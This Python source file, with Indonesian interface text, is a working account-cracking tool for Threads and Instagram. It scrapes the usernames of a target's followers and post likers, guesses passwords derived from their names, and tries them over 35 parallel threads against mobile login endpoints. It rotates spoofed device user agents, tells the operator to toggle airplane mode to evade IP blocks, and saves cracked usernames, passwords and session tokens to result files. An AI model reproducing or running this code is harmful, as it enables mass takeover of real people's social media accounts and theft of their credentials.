    def Next_Pengikut(self, cookies, user_ids, __hs, lsd, av, jazoest, fb_dtsg, __hsi, after):
        try:
            with requests.Session() as r:
                r.headers.pop('Accept-Encoding');r.headers.pop('Accept');r.headers.pop('Connection')
                r.headers.update({
            ...
            if '\'full_name\': \'' in str(self.json_data) or '\'username\': \'' in str(self.json_data):
                ...
                if '\'page_info\': {\'end_cursor\':' in str(self.json_data) and '\'has_next_page\': True,' in str(self.json_data):
                    self.end_cursor = re.search("'end_cursor': '(.*?)',", str(self.json_data)).group(1)
                    self.Next_Pengikut(cookies, user_ids, __hs, lsd, av, jazoest, fb_dtsg, __hsi, self.end_cursor)
                else:
                    return ("Dump Sukses")
            else:
                Console().print(f"[bold grey50]   ╰─>[bold red] Tidak Ada Pengguna Yang Ditemukan!", end='\r')
            ...
            Console().print(f"[bold grey50]   ╰─>[bold red] Koneksi Error...                            ", end='\r')
            time.sleep(7.5)
            self.Next_Pengikut(cookies, user_ids, __hs, lsd, av, jazoest, fb_dtsg, __hsi, after)
        except (KeyboardInterrupt):
            Console().print(f"                                                               ", end='\r')
            time.sleep(1.5)
            return ("Dump Sukses")

    def Exsekusi_Likes(self, cookies, link_postingan):
        try:
            with requests.Session() as r:
                r.headers.pop('Accept-Encoding');r.headers.pop('Accept');r.headers.pop('Connection')
                r.headers.update({
                ...
                self.post_id = re.search('"post_id":"(\d+)"', str(response.text)).group(1)
                self.__hs = re.search('"haste_session":"(.*?)",', str(response.text)).group(1)
                self.lsd = re.search('\\["LSD",\\[\\],{"token":"(.*?)"}', str(response.text)).group(1)
                self.av = re.search('"actorID":"(\d+)",', str(response.text)).group(1)
                self.jazoest = re.search('&jazoest=(\d+)",', str(response.text)).group(1)
                ...
                self.Next_Likes(cookies, self.post_id, self.__hs, self.lsd, self.av, self.jazoest, self.fb_dtsg, self.__hsi)
        except (Exception) as e:
            Console().print(f"[bold grey50]   ╰─>[bold red] {str(e).upper()}!", end='\r')
            time.sleep(5.0)
            return ("Dump Error")

    def Next_Likes(self, cookies, post_id, __hs, lsd, av, jazoest, fb_dtsg, __hsi):
        try:
            with requests.Session() as r:
                r.headers.pop('Accept-Encoding');r.headers.pop('Accept');r.headers.pop('Connection')
                r.headers.update({
                ...
                'x-ig-app-id': '238260118697367',
                'accept': '*/*',
                'x-fb-friendly-name': 'BarcelonaPostLikersDialogQuery',
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'x-fb-lsd': lsd,
                'accept-encoding': 'gzip, deflate',
                'Host': 'www.threads.net',
            ...
            data = {
                ...
                '__hsi': __hsi,
                'jazoest': jazoest,
                'fb_api_req_friendly_name': 'BarcelonaPostLikersDialogQuery',
                'lsd': lsd,
                'variables': '{"mediaID":"' + str(post_id) + '","__relay_internal__pv__BarcelonaIsLoggedInrelayprovider":true}',
                '__hs': __hs,
                'doc_id': '6802034649835446',
                '__ccg': 'UNKNOWN',
            }
            response2 = r.post('https://www.threads.net/api/graphql', data = data, cookies = {
                'cookie': cookies,
            ...
            Console().print(f"[bold grey50]   ╰─>[bold red] Koneksi Error...                            ", end='\r')
            time.sleep(7.5)
            self.Next_Likes(cookies, post_id, __hs, lsd, av, jazoest, fb_dtsg, __hsi)
        except (KeyboardInterrupt):
            Console().print(f"                                                               ", end='\r')
            time.sleep(1.5)
            return ("Dump Sukses")
...
class Useragents:
    ...
    def Barcelona_Useragent(self):
        ...
        self.jenis = random.choice(Useragent['Name'].split(',')).capitalize()
        if self.jenis == 'Realme':
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; Realme; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; samsung; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; OPPO; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; vivo; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; Xiaomi; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; Xiaomi/POCO; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; HUAWEI; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; INFINIX MOBILITY LIMITED/Infinix; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; asus; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android (21/{}; {}; LENOVO; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; HMD Global/Nokia; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; OnePlus; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
        elif self.jenis == 'Lg':
            self.android_version = random.choice(['9', '10'])
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; LGE/lge; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; Google/google; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; motorola; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
        elif self.jenis == 'Htc':
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; HTC/htc; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; LGE/google; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; TECNO MOBILE LIMITED/TECNO; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; Sony/docomo; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; KYOCERA; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; FUJITSU/DOCOMO; {}; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model.replace(' ', '-'), self.device_model.replace('-', '')))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; Meizu; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; Micromax; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; ITEL MOBILE LIMITED/Itel; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            ...
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; SHARP/KDDI; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
        else:
            self.android_version = random.choice(['10', '11', '9', '12', '13'])
            self.device_model = random.choice(['CPH1861', 'RMX3630', 'RMX3663', 'RMX3663', 'RMX3661', 'RMX3687', 'RMX3686', 'RMX3687', 'RMX3687', 'RMX1805', 'RMX1809', 'RMX1805', 'RMX1801', 'RMX1807', 'RMX1821', 'RMX1825', 'RMX1851', 'RMX1827', 'RMX1911', 'RMX1971', 'RMX2030', 'RMX1925', 'RMX2001', 'RMX2061', 'RMX2040', 'RMX2002', 'RMX2151', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3388', 'RMX3474', 'RMX3474', 'RMX3472', 'RMX3471', 'RMX3393', 'RMX3392', 'RMX3491', 'RMX3612', 'RMX1811', 'RMX2185', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX2101', 'RMX1941', 'RMX1941', 'RMX1945', 'RMX1945', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3261', 'RMX3263', 'RMX3191', 'RMX3193', 'RMX3195', 'RMX3197', 'RMX3269', 'RMX3268', 'RMX2020', 'RMX2027', 'RMX2021', 'RMX3623', 'RMX3581', 'RMX3690', 'RMX3501', 'RMX3503', 'RMX3501', 'RMX3624', 'RMX3511', 'RMX3710', 'RMX3311', 'RMX3310', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX2202', 'RMX2202', 'RMX3363', 'RMX3360', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3370', 'RMX3370', 'RMX3370', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3561', 'RMX3561', 'RMX3560', 'RMX3562', 'RMX3563', 'RMX3371', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3706', 'RMX3350', 'RMX3350', 'RMX3350', 'RMX2193', 'RMX2193', 'RMX2161', 'RMX2163', 'RMX2050', 'RMX2050', 'RMX2156', 'RMX3242', 'RMX3171', 'RMX3286', 'RMX3572', 'RMX3395', 'RMX3395', 'RMX3396', 'RMX3396', 'RMX3430', 'RMX3516', 'RMX3235', 'RMX3235', 'RMX3506', 'RMX3506', 'RMP2103', 'RMP2102', 'RMP2102', 'RMP2106', 'RMP2105', 'RMP2107', 'RMP2108', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX3161', 'RMX3161', 'RMX3161', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX3142', 'RMX3142', 'RMX3461', 'RMX3461', 'RMX3478', 'RMX3478', 'RMX3372', 'RMX3372', 'RMX3372', 'RMX3574', 'RMX1831', 'RMX3121', 'RMX3122', 'RMX3121', 'RMX3125', 'RMX3125', 'RMX3042', 'RMX3041', 'RMX3041', 'RMX3043', 'RMX3042', 'RMX3092', 'RMX3093', 'RMX3092', 'RMX3611', 'RMX3611', 'RMX3610', 'RMX3611', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3475', 'RMX2201', 'RMX2200', 'RMX2200', 'RMX2200', 'RMX2111', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1991', 'RMX1992', 'RMX1993', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX2083', 'RMX2142', 'RMX2081', 'RMX2086', 'RMX2144', 'RMX2071', 'RMX2071', 'RMX2071', 'RMX2075', 'RMX2076', 'RMX2072', 'RMX2072', 'RMX2072', 'RMX2052', 'RMX2176', 'RMX2176', 'RMX2121', 'RMX2121', 'RMX2121', 'RMX3115', 'RMX3115', 'RMX3115', 'RMX1921', 'RMX1921', 'RMX1921'])
            self.useragent = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; Realme; {}; marlin; qcom; in_ID; 489720145)'.format(self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
...
class Pengaturan:
    ...
    def __init__(self) -> None:
        try:
            Console(width = 65, style = "bold grey50").print(Panel(f"""[bold green]01[bold white]. Gunakan Metode https://i.instagram.com ([bold green]Threads Apps New[bold white])
[bold green]02[bold white]. Gunakan Metode https://i.instagram.com ([bold red]Instagram Apps[bold white])""", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Pilih Metode) [bold green]<[bold yellow]<[bold red]<", subtitle = "╭─────", subtitle_align = "left"))
            method = Console().input("[bold grey50]   ╰─> ")
            if method == '02' or method == '2':
                Metode.update({
                    "Type": "02"
                })
            else:
            ...
            Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Silahkan Masukan Useragent Direkomendasikan Menggunakan Useragent Tunggal Dari ([italic green]Realme,Samsung,Oppo,Xiaomi,Vivo,\nPoco,Huawei,Infinix,Motorola,Pixel,Oneplus,Nexus,\nTecno,Itel[italic white]), Misalnya :[italic green] Realme,Samsung,Xiaomi,Oppo[bold white] *Gunakan Koma Untuk Useragent Acak!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle = "╭─────", subtitle_align = "left"))
            user_agent = Console().input("[bold grey50]   ╰─> ")
            Useragent.update({
                "Name": user_agent
            })
            Console(width = 65, style = "bold grey50").print(Panel(f"""[bold green]01[bold white]. Gunakan Password Lengkap ([bold green]Nama, Nama123, Nama1234, Dll[bold white])
[bold green]02[bold white]. Gunakan Password Default ([bold red]Nama, Nama123, Nama12345[bold white])""", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Pilih Password) [bold green]<[bold yellow]<[bold red]<", subtitle = "╭─────", subtitle_align = "left"))
            password = Console().input("[bold grey50]   ╰─> ")
            if password == '02' or password == '2':
                Password.update({
                    "Type": "Default"
                })
            else:
...
class Cracking:
    ...
    def Memulai(self):
        global Sukses, Looping, Checkpoint, Dump
        try:
            self.pilihan_metode = str(Metode['Type'])
            if self.pilihan_metode == '01':
                Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Sedang Melakukan Cracking Kamu Wajib Menghidupkan[italic red] Mode Pesawat[italic white] Jika Ada Perintah Atau Jika Muncul[italic red] Tulisan Error[italic white] Dan Anda Bisa Menggunakan[italic green] CTRL + Z[italic white] Jika Ingin Berhenti!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                with ThreadPoolExecutor(max_workers=35) as s:
                    for z in Dump:
                        self.username, self.full_name = z.split('|')[0], z.split('|')[1]
                        self.password = self.Password(self.full_name)
                        s.submit(self.MAIN_THREADS, Dump, self.username, self.password)
                Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Selamat Kamu Telah Mendapatkan {len(Sukses)} Hasil Sukses Dan {len(Checkpoint)} Hasil Checkpoint Dari {len(Dump)} Username!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Selesai) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            else:
                Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Sedang Melakukan Cracking Kamu Wajib Menghidupkan[italic red] Mode Pesawat[italic white] Jika Ada Perintah Atau Jika Muncul[italic red] Tulisan Error[italic white] Dan Anda Bisa Menggunakan[italic green] CTRL + Z[italic white] Jika Ingin Berhenti!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                with ThreadPoolExecutor(max_workers=35) as s:
                    for z in Dump:
                        self.username, self.full_name = z.split('|')[0], z.split('|')[1]
                        self.password_list = self.Password(self.full_name)
                        s.submit(self.MAIN_INSTAGRAM, Dump, self.username, self.password)
                Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Selamat Kamu Telah Mendapatkan {len(Sukses)} Hasil Sukses Dan {len(Checkpoint)} Hasil Checkpoint Dari {len(Dump)} Username!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Selesai) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        except (Exception) as e:
            Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]{str(e).title()}!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"))
    ...
    def MAIN_THREADS(self, total, username, passwords):
        global Looping, Sukses, Checkpoint, Salah
        try:
            for password in passwords:
                if len(password) < 6:
                    ...
                    with requests.Session() as r:
                        self.useragent, self.persen = Useragents().Barcelona_Useragent(), (Looping * 100 / len(total))
                        self.x_ig_device_id, self.x_ig_family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
                        self._hash = hashlib.md5()
                        self._hash.update(username.encode('utf-8') + password.encode('utf-8'))
                        self.hex_ = self._hash.hexdigest()
                        ...
                        if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
                            ...
                            try:
                                ...
                                self.pengikut, self.mengikuti, self.postingan = (None, None, None, None)
                            except:break
                            Console().print(f"                                                               ", end='\r')
                            time.sleep(1.5)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style = "bold grey50"), style="bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style = "bold grey50", width=30), Panel(f"[bold red]{password}", style = "bold grey50", width=30)]))
                            tree.add(Panel(f"[bold red]{self.useragent}", style = "bold grey50", width=61))
                            tree.add(Columns([Panel(f"[bold red]{self.pengikut}", style = "bold grey50", width=19), Panel(f"[bold red]{self.mengikuti}", style = "bold grey50", width=21), Panel(f"[bold red]{self.postingan}", style = "bold grey50", width=19)]))
                            print(tree)
                            time.sleep(4.5)
                            Checkpoint.append(f'{username}|{password}|{self.pengikut}|{self.mengikuti}|{self.postingan}|{self.useragent}')
                            with open(f'Results/Cp-{Convert().Tanggal_Sekarang()}.txt', 'a+') as w:
                                w.write(f'{username}|{password}|{self.pengikut}|{self.mengikuti}|{self.postingan}|{self.useragent}\n')
                            w.close()
                            break
                        elif 'ip_block' in str(response.text.replace('\\', '')):
                            Console().print(f"                                                               ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold grey50]   ──>[bold yellow] HIDUPKAN MODE PESAWAT 2 DETIK!", end='\r')
                            time.sleep(7.5)
                        elif 'Unmapped IG Error' in str(response.text.replace('\\', '')) or 'This IG Error was not mapped to an Error Code.' in str(response.text.replace('\\', '')):
                            Console().print(f"                                                               ", end='\r')
                            time.sleep(0.07)
                            ...
                            Console().print(f"                                                               ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold grey50]   ──>[bold red] TERJADI KESALAHAN TAK TERDUGA!", end='\r')
                            time.sleep(1.5)
                        elif 'Please wait a few' in str(response.text.replace('\\', '')) or 'Harap tunggu beberapa' in str(response.text.replace('\\', '')):
                            Console().print(f"                                                               ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold grey50]   ──>[bold blue] HARAP TUNGGU BEBERAPA MENIT!", end='\r')
                            time.sleep(7.5)
                            ...
                            continue
            Looping += 1
            Console().print(f"[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{str(self.persen)[:4]}%[bold grey50]/[bold white]{str(len(total))}[bold grey50]/[bold white]{Looping}[bold grey50]/[bold white]{Salah} Ok:-[bold green]{len(Sukses)}[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white]     ", end='\r')
        except (RequestException):
            Console().print(f"                                                               ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold grey50]   ──>[bold red] KONEKSI ERROR!", end='\r')
            time.sleep(10.0)
            self.MAIN_THREADS(total, username, passwords)
        except (Exception) as e:
            Console().print(f"                                                               ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold grey50]   ──>[bold red] {str(e).upper()}!", end='\r')
    ...
    def MAIN_INSTAGRAM(self, total, username, passwords):
        ...
        try:
            for password in passwords:
                if len(password) < 6:
                    ...
                    with requests.Session() as r:
                        self.useragent, self.persen = str(Useragents().Barcelona_Useragent()).replace('Barcelona 289.0.0.77.109', 'Instagram 103.1.0.15.119').replace('489720145', '164094530'), (Looping * 100 / len(total))
                        self._hash = hashlib.md5()
                        self._hash.update(username.encode('utf-8') + password.encode('utf-8'))
                        self.hex_ = self._hash.hexdigest()
                        ...
                        try:
                            ...
                            Console().print(f"                                                               ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold grey50]   ──>[bold red] CSRF-TOKEN ERROR!", end='\r')
                            time.sleep(2.5)
                            continue
                        r.headers.update({
                        ...
                        if 'logged_in_user' in str(response2.text) or 'sessionid' in r.cookies.get_dict().keys():
                            try:
                                ...
                                self.ig_set_authorization, self.username, self.pengikut, self.mengikuti, self.postingan = (None, None, None, None, None)
                            except:break
                            Console().print(f"                                                               ", end='\r')
                            time.sleep(1.5)
                            tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style = "bold grey50"), style="bold white")
                            ...
                            Console().print(f"                                                               ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold grey50]   ──>[bold red] VERSION APLIKASI INSTAGRAM TERBLOKIR!", end='\r')
                            time.sleep(7.5)
                            ...
                            Console().print(f"                                                               ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold grey50]   ──>[bold red] OOPS, AN ERROR OCCURRED![bold white]", end='\r')
                            time.sleep(2.5)
                            ...
                            continue
            Looping += 1
            Console().print(f"[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:20]}[bold grey50]/[bold white]{str(self.persen)[:4]}%[bold grey50]/[bold white]{str(len(total))}[bold grey50]/[bold white]{Looping} Ok:-[bold green]{len(Sukses)}[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white]     ", end='\r')
        except (RequestException):
            Console().print(f"                                                               ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold grey50]   ──>[bold red] KONEKSI ERROR!", end='\r')
            time.sleep(10.0)
            self.MAIN_INSTAGRAM(total, username, passwords)
        except (Exception) as e:
            Console().print(f"                                                               ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold grey50]   ──>[bold red] {str(e).upper()}!", end='\r')
...
def Pengguna():
    try:
        with requests.Session() as r:
            ...
            response = r.get('https://justpaste.it/35zd1').text
            jumlah, online = re.search('"viewsText":"(.*?)"', str(response)).group(1), re.search('"onlineText":"(\d+)"', str(response)).group(1)
        return (jumlah.replace(',','.'), online)
    except (Exception) as e:
        return ('Down', '404')
...
class Melihat:
    ...
    def __init__(self) -> None:
        Console(width = 65, style = "bold grey50").print(Panel("""[bold green]01[bold white]. Melihat Hasil Crack Checkpoint
[bold green]02[bold white]. Melihat Hasil Crack Sukses
[bold green]03[bold white]. Kembali ([bold red]Back[bold white])""", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Lihat Hasil) [bold green]<[bold yellow]<[bold red]<", subtitle = "╭─────", subtitle_align = "left"))
        query = Console().input("[bold grey50]   ╰─> ")
        if query == '01' or query == '1':
            Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Silahkan Masukan File Checkpoint Ketik ([italic red]dir Results[italic white]) Untuk Mengetahui Nama File Dan Pastikan Terdapat Hasil Dalam File Tersebut, Misalnya :[italic green] Results/Cp-{Convert().Tanggal_Sekarang()}.txt", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle = "╭─────", subtitle_align = "left"))
            files = Console().input("[bold grey50]   ╰─> ")
            Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Sedang Menampilkan Hasil Crack Jika Terjadi Error Mungkin Ada Masalah Di File Results!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            if 'Results/' in str(files):
                self.read_file = open(files, 'r').read().splitlines()
            else:
                self.read_file = open(f'Results/{files}', 'r').read().splitlines()
            for z in self.read_file:
                try:
                    self.username, self.password, self.pengikut, self.mengikuti, self.postingan, self.useragent = z.split('|')[0], z.split('|')[1], z.split('|')[2], z.split('|')[3], z.split('|')[4], z.split('|')[5]
                    Console().print(f"                                                               ", end='\r')
                    time.sleep(1.5)
                    tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style = "bold grey50"), style="bold white")
                    tree.add(Columns([Panel(f"[bold red]{self.username}", style = "bold grey50", width=30), Panel(f"[bold red]{self.password}", style = "bold grey50", width=30)]))
            ...
            Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Silahkan Masukan File Success Ketik ([italic red]dir Results[italic white]) Untuk Mengetahui Nama File Dan Pastikan Terdapat Hasil Dalam File Tersebut, Misalnya :[italic green] Results/Ok-{Convert().Tanggal_Sekarang()}.txt", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle = "╭─────", subtitle_align = "left"))
            files = Console().input("[bold grey50]   ╰─> ")
            Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Sedang Menampilkan Hasil Crack Jika Terjadi Error Mungkin Ada Masalah Di File Results!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            if 'Results/' in str(files):
                self.read_file = open(files, 'r').read().splitlines()
            ...
            for z in self.read_file:
                try:
                    self.username, self.password, self.pengikut, self.mengikuti, self.postingan, self.ig_set_authorization, self.useragent = z.split('|')[0], z.split('|')[1], z.split('|')[2], z.split('|')[3], z.split('|')[4], z.split('|')[5], z.split('|')[6]
                    Console().print(f"                                                               ", end='\r')
                    time.sleep(1.5)
                    tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style = "bold grey50"), style="bold white")
                    tree.add(Columns([Panel(f"[bold green]{self.username}", style = "bold grey50", width=30), Panel(f"[bold green]{self.password}", style = "bold grey50", width=30)]))
            ...
            Console(width = 65, style = "bold grey50").print(Panel(f"[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Fitur!", title = "[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"))
            time.sleep(2.5)
            Fitur()
